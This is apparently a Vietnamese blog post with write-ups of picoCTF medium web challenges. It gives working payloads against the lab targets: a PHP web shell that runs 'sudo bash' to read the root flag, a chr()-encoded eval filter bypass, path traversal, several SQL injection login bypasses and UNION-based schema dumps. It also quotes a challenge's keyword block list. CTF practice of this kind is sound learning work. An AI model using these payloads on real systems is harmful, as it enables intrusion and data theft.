---
title: '[PicoCTF] Web Exploitation Medium'
published: 2025-03-04
description: 'Write up vài bài web medium trên picoctf trước khi chuyển sang weigh căng hơn'   
image: 'https://raw.githubusercontent.com/Cajac/picoCTF-Writeups/refs/heads/main/picoctf_logo.png'
tags: [PicoCTF]
category: 'CTF'
draft: false
lang: 'vi'
---

# n0s4n1ty 1:
Bài này úp file lên để server thực thi mã độc (php), do server ko sanitize đúng cách.

Giải thích payload bên dưới:     
1. Thẻ pre để hiển thị theo hàng cho đẹp (kiểu html)
2. Vẫn còn đang ở user www-data nên ko thể command injection abc;xyz;hehe kiểu vầy
    bởi khi chạy sudo su; xong nó sẽ lập tức thoát vì nó là subshell root

=> Phải đảm bảo cùng 1 phiên dùng lệnh
    system("sudo bash -c "cd /root/ && ls -la && cat flag.txt");

Payload:
```
<?php
echo "<pre>";
system("sudo bash -c "cd /root/ && ls -la && cat flag.txt");
echo "</pre>";
?>
```

# ev@l:
```
open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116), chr(114)).read()

tương ứng cho:
open("/flag.txt", "r").read()
```

Ban đầu định dùng os hay __import rồi read hoặc sys hoặc subprocess để đọc nhưng regex của đề đã chặn
đây là regex của đề:

```
Secure python_flask eval execution by 
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
```

Vậy thôi dựa vào kn thì dùng open cho dễ, cú pháp open(path,mode).read()

=> Mode là r để read

Và vì regex chặn 1 vài kí tự như / và các kí tự chữ cái thông thường nên ta tìm cách lươn lẹo

=> chr(): hàm chuyển số sang kí tự ASCII

dùng toán tự + để nhồi nhét và đọc, hết.

# findme:
bài xàm vãi đái, dùng burp suite intercept gói tin và trong lúc nó chuyển hướng thì trên header GET có 2 đoạn base64 khá sus
```
GET /next-page/id=cGljb0NURntwcm94aWVzX2Fs HTTP/1.1

GET /next-page/id=bF90aGVfd2F5XzI1YmJhZTlhfQ== HTTP/1.1
```
Ghép nó lại làm 1 và dùng cyberchef decode thì ra flag, thôi kệ nó cũng bắt mình hình thành thói quen dùng tool cam, hết.

# Forbidden Paths:
Đọc tên bài và hint: 
>We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. Can you get past the filter to read the flag?

=> Có vẻ là path traversal

Dùng burp suite intercept các gói tin khi submit search tới read.php thì thấy nó nhận tham số như sau

> filename=the-happy-prince.txt&read=

=> gửi tới repeater để send payload
=> thay thế filename bằng 4 lần ../ để lên /
=> sau đó thêm flag.txt để đọc từ /

Payload:
```
filename=the-happy-prince.txt&read=
```
flag là: `picoCTF{7h3_p47h_70_5ucc355_6db46514}`

# SQLiLite:
sql injection bình thường

nhập vào username để đọc admin và comment (--) trong password để truy cập admin và bypass password, sau đó ctrl + u xem source code để lấy flag, hết.

Payload:
```
admin' or 1=1 --
```
# more sqli: 
:::Note
Bài này khá hay vì mình cần phải biết viết sql, biết sqlite, biết cấu trúc và cách liệt kê sqlite với lại google tìm document cho sqlite injection. OK, bắt đầu hoy
:::

Mới vào thấy trang login, nhập đại đại thì nó ra 1 query truy vấn

```
username: ad
password: asd
SQL query: SELECT id FROM users WHERE password = 'asd' AND username = 'ad'
```

mình thấy ngay `username` lúc này ko còn phía trước nữa, tức là khó mà truy xuất `'admin'` khi không có `password`

khúc này bí cmnr, lên mạng xem write up thì à, cứ tiếp tục sqli đi dù ko hỉu tại sao ( i guess that's the point of solving this)

mình sẽ sqli vào password và dùng comment `--` (đây là dấu comment trong SQLServer, SQLite,..) cho mất thằng username

payload đầu tiên:
```
username: anything
password: ' or 1=1 --
```

web chuyển hướng sang 1 trang input search, với hint đề bài là sqlite thì khả năng rằng database dùng sqlite rồi

nhưng để học tập, thì đây là cách nhận biết database dùng sqlite

payload 2:
```
' union all select sqlite_version(), null, null --
```

:::Important
1. Từ payload 2 ta học thêm cách sử dụng 'all', đây là 1 cách để lấy tất cả dữ liệu, kể cả bản ghi trùng, rất tốt để khai thác tối ưu thông tin

2. Vì web /search (tạm gọi là /search) có 3 cột là Citi, Address, Phone, vì vậy bắt buộc lệnh union phía sau phải fill hết 3 cột này, mà mình chỉ cần 1 cột nên 2 cột còn lại để null. Nhớ là phải fill, ko fill ko chạy được (do UNION yêu cầu số lượng cột trong 2 truy vấn phải khớp)
:::
BOOM, database trả về version của sqlite

:::tip
Từ đây bạn cần có tư duy + thói quen khi biết bất kì 1 phiên bản nào của bất kì cái gì, nên đi google nó, xem nó trông ra sao, document thế nào, có lổ hổng gì ko (CVE?) 

Trường hợp này version 3.31.1, mình check 1 cheetsheet (kiểu phao lúc bạn đi thi ấy) này cho lẹ:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
:::

ok, thấy ngay

> Extract Database Structure (sqlite_version > 3.33.0)	SELECT sql FROM `sqlite_master`

=> tìm cột sql là sẽ ra toàn bộ database `(đây là chức năng đặc trưng của sqlite)`


payload 3:
```
' UNION SELECT sql,NULL,NULL FROM sqlite_master --
```

BOOM, nguyên cái database lộ ra với table tên more_table có 1 cột rất sussy baka tên là flag
=> select nó thôi anh em

payload 4:
```
' UNION ALL SELECT flag, null, null from more_table --
```
flag: `picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8ee9477}`

# Sql direct:
bài này giúp mình làm quen với `postgreSQL`

dùng help để đọc manual

hint bảo là 'What does a SQL database contain?'

=> có vẻ muốn mình tìm toàn bộ table của database (ví như sqlite_master của sqlite)

đọc manual hồi thì thấy lệnh `\dt`

xuất hiện table có name là `flags`

```
select * from flags;
```

hết.

# Irish-Name-Repo 1:
sqli

payload:
```
username: admin' OR '1'='1
```

# Irish-Name-Repo 2:
bài này thử username: `admin' or 1=1` thì được báo là 'sqli detected'

inspect element 1 chút thì thấy có 1 tham số khá sus
<input type="hidden" name="debug" value="0">

(hoặc bạn có thể vào burp suite post request sẽ thấy `debug=0` luôn được gửi tự động)

thử chuyển `debug=1` thì nó ra luôn cái query mà server call, từ đó tìm cách sqli

nghĩ 1 chút thì khỏi cần or 1=1 chi cho dài dòng, cứ `username: admin'--` là ok, hết.

payload:

```
username: admin'--
password: test
SQL query: SELECT * FROM users WHERE name='admin'--' AND password='test'
```

# Irish-Name-Repo 3:
bài này như bài 2, phải bật debug lên coi query nó ra sao

thì khi mà mình payload chữ `hehe`

=> server trả về `'urur'`

hmm mình nghĩ chắc là `mã hóa ceasar` (đoán vậy dựa trên kinh nghiệm giải vài bài crypto đơn giản)

chữ `aaaa`
=> server trả về `'nnnn'`

hỏi con grok.com thì đúng là sẽ bị chuyển dịch 13 kí tự (mã hóa ROT13)

kêu nó encode cho mình payload sau:

> admin' or 1=1 --

kết quả:

> nqzva' BE 1=1--

nhập vào tham số `password` và lấy flag, hết.